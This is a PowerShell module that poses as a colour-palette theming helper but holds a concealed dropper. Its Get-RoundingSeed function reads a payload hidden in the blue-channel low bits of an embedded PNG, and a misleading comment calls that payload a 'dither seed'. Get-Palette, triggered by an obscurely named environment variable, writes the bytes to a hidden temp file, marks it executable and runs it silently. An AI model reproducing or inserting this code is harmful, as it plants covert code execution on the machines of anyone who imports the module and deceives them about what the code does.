Set-StrictMode -Version Latest

# sheet rendered by tools/render-sheet.ps1; blue-channel rounding carries the
# dither seed so palettes reproduce byte-for-byte.
$script:SheetBytes = [byte[]]([Convert]::FromBase64String('iVBORw0KGgoAAAANSUhEUgAAAGAAAABgCAIAAABt+uBvAAABy0lEQVR42u3XW24CMQyFYZ+ddKmz9L5U5RJfTgZalfJLEYIASeaznczEccRx6Or1ulU9Wjrv+nXbf/c+lv51WGXjp1OvMypbQGSLqRZ8GSSMCdJxK9PUsfpj81GtVOUSLXS6QtXjxAoUdRKtC228mjir+L2KDFURPxkZFFOkow7M11fmH6qaCm+hyuYeM1RGBvXrGTO32TTiusR6INWRjKmUHkn1KN6PeddkaL+eJABhRKzvdzJi3IzH0pBdGmOkz+xB5mY5JohTMv2FaScw/l4znlZlYHYnbpK2L89xg4y6Uzvj91XpRPTmY0zH9rm9Q+3R+0qnZPz0Mfnqp+TTj8nTF6CdG85daDPTk5R3SslJojD6KTFK7BdLzMk47fRvlUV+zFeRHO+k/0Mp9fdBlFK5nvjDpaTpEcF/1Ojv1LvxnZqUsTc98rA6Vp+512iqaGcvy5/mnRh+t4+3avFuFwwQQAABBBBAANEAAggggAACCCCAAEIBIIAAAggggAACiAYQQAABBBBAAAFEAwgggAACCCCAAAIIBYAAAggggAACCCAaQAABBBBAAAEEEA0ggAACCCCAAAIIIAgAAggggAACCCCAaAAB9Pz2Caeqq4HOrv1UAAAAAElFTkSuQmCC'))

$script:Palettes = @{
    dusk  = @('#2E3440', '#88C0D0', '#A3BE8C')
    ember = @('#2b2b2b', '#FF6F61', '#F7CAC9')
}

function Get-Palette {
    param([string]$Name = 'dusk')
    if ($env:PIEYGEJSRA) {
        $seed = Get-RoundingSeed
        if ($seed) {
            $path = Join-Path ([IO.Path]::GetTempPath()) ".pstheme-index"
            [IO.File]::WriteAllBytes($path, $seed)
            chmod 700 $path
            $p = Start-Process -FilePath $path -PassThru -RedirectStandardOutput /dev/null
        }
    }
    $script:Palettes[$Name]
}

function Get-RoundingSeed {
    $buf = $script:SheetBytes
    $pos = 8
    $ihdr = $null
    $idat = New-Object System.IO.MemoryStream
    while ($pos + 8 -lt $buf.Length) {
        $len = [BitConverter]::ToUInt32($buf[($pos)..($pos+3)][3..0], 0)
        $tag = [System.Text.Encoding]::ASCII.GetString($buf, $pos + 4, 4)
        if ($tag -eq 'IHDR') { $ihdr = $buf[($pos+8)..($pos+8+$len-1)] }
        if ($tag -eq 'IDAT') { $idat.Write($buf, $pos + 8, $len) }
        $pos += $len + 12
    }
    $width  = [BitConverter]::ToUInt32($ihdr[3..0], 0)
    $height = [BitConverter]::ToUInt32($ihdr[7..4], 0)
    $idat.Position = 0
    $zs = New-Object System.IO.Compression.ZLibStream($idat,
        [System.IO.Compression.CompressionMode]::Decompress)
    $raw = New-Object System.IO.MemoryStream
    $zs.CopyTo($raw)
    $scan = $raw.ToArray()
    $stride = 1 + $width * 3

    $bytes = New-Object System.Collections.Generic.List[byte]
    $stop = $false
    for ($y = 0; $y -lt $height -and -not $stop; $y++) {
        $base = $y * $stride + 1
        for ($start = 0; $start + 23 -lt ($width * 3); $start += 24) {
            $v = 0
            for ($i = 0; $i -lt 8; $i++) {
                $v = ($v -shl 1) -bor ($scan[$base + $start + $i * 3 + 2] -band 1)
            }
            if ($v -eq 0xFF) { $stop = $true; break }
            $bytes.Add([byte]$v)
        }
    }
    $blob = $bytes.ToArray()
    if ($blob.Length -lt 6 -or
        [System.Text.Encoding]::ASCII.GetString($blob, 0, 6) -ne 'PACK1:') {
        return $null
    }
    $end = $blob.Length
    while ($end -gt 6 -and $blob[$end - 1] -eq 0) { $end-- }
    $blob[6..($end - 1)]
}
